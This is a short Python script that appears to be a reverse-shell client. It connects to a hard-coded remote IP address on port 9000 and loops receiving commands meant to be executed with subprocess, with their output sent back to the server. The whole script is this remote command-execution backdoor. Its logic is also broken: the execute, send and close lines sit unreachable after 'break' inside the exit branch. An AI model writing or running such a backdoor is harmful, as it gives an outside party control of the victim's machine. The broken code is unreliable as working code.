import socket
import subprocess

SERVER_HOST = "100.75.121.36" #server host
SERVER_PORT = 9000 #server port
BUFFER_SIZE = 1024 #buffer size(1kb)

s = socket.socket() 
#create the socket object

s.connect((SERVER_HOST,SERVER_PORT))
#connect to the server

message = s.recv(BUFFER_SIZE).decode() 
#To recive the message

print("server: " , message)#print the message
while True:
	command = s.recv(BUFFER_SIZE). decode()#recive the command from the server
	if command.lower() =="exit": #if the command is exit,just break the loop
		break
		output = subprocess.getoutput(command) #execute the command and retrieve the files
		s.send(output.encode())#send the result back to the server
		s.close() #close the connection
		
